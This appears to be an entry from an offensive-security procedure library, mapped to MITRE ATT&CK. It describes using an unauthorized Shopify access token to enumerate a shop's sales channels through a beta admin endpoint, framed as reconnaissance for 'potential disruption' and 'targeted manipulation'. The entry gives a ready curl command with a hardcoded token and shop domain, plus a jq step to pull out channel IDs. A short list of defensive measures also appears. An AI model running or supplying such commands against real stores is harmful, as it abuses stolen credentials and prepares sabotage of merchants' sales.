---
tags:
  - shopify
  - api-enumeration
  - channels
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/shopify-get-channels-list]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:01.749Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 8bf924c1-7d74-455d-8a4b-ec5da6345a92
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# List-Shopify-Sales-Channels

## Summary

This procedure uses the unauthorized access token to retrieve a list of all sales channels via the beta API, identifying active channels for potential disruption.

## Description

The GET request to /admin/channels.json with the X-Shopify-Access-Token header exploits the lack of permission checks, returning sensitive channel configurations that control sales across platforms like online stores or POS.

## Requirements

1. Valid access token with channels scopes
2. Target shop domain
3. HTTP client supporting headers

## Defense

Defensive measures and detection strategies:

- Require engineering flag for channels endpoint access
- Log all API calls to beta endpoints
- Implement rate limiting on channel queries
- Alert on unauthorized scope usage

## Objectives

1. Enumerate all sales channels
2. Gather IDs for targeted manipulation
3. Assess merchant sales setup

## Instructions

### Step 1: Send GET Request for Channels

**Context**: Authenticate with the token to list channels.

**Command** ([[commands/shopify-get-channels-list]]):
```bash
curl -H "X-Shopify-Access-Token: 77a01fc64f65fd16b0b38bc31694e4ce" "https://while42.myshopify.com/admin/channels.json"
```

> Returns JSON with channel objects including id, type, and provider_id.

### Step 2: Parse Response for IDs

**Context**: Extract channel IDs from the JSON output.

**Command** (jq or manual):
```bash
curl ... | jq '.channels[].id'
```

> Expected: Array of channel IDs.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/shopify-get-channels-list]]

## Tools Used


## Tags

- [[shopify]]
- [[api-enumeration]]
- [[channels]]
